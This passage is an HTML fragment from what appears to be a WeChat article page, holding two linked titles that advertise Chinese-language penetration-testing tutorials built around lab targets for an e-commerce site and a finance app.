0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(221, 221, 221);max-width: 100%;box-sizing: border-box !important;"><section style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;text-align: center;"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a class="normal_text_link" target="_blank" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;color: rgb(87, 107, 149);text-decoration: none;-webkit-user-drag: none;cursor: default;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;" href="https://mp.weixin.qq.com/s?__biz=MzkzMDE5OTQyNQ==&amp;mid=2247488993&amp;idx=1&amp;sn=c000a3dac67c71e57d82593432eec341&amp;scene=21#wechat_redirect" textvalue="渗透测试|倒反天罡！转发给你的老师《0基础也能学渗透测试+代码审计电商平台靶场》让他重修" data-itemshowtype="0" linktype="text" data-linktype="2"><span textstyle="" style="font-weight: bold;">渗透测试|倒反天罡！转发给你的老师《0基础也能学渗透测试+代码审计电商平台靶场》让他重修</span></a></span></section></td></tr><tr style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><td data-colwidth="576" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(221, 221, 221);max-width: 100%;box-sizing: border-box !important;"><section style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;text-align: center;"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a class="normal_text_link" target="_blank" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;color: rgb(87, 107, 149);text-decoration: none;-webkit-user-drag: none;cursor: default;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;" href="https://mp.weixin.qq.com/s?__biz=MzkzMDE5OTQyNQ==&amp;mid=2247488787&amp;idx=1&amp;sn=08b8712c4dcc1ec45538e3c383ebce42&amp;scene=21#wechat_redirect" textvalue="渗透测试|学校教不会的我来教，一篇文章学习渗透测试那些事(某金融程序靶场测试的项目式教学)" data-itemshowtype="0" linktype="text" data-linktype="2"><span textstyle="" style="font-weight: bold;">渗透测试|学校教不会的我来教，一篇文章学习渗透测试那些事(某金融程序靶场测试的项目式教学)</span></a></span></section></td></tr></tbody></table>  
  
  
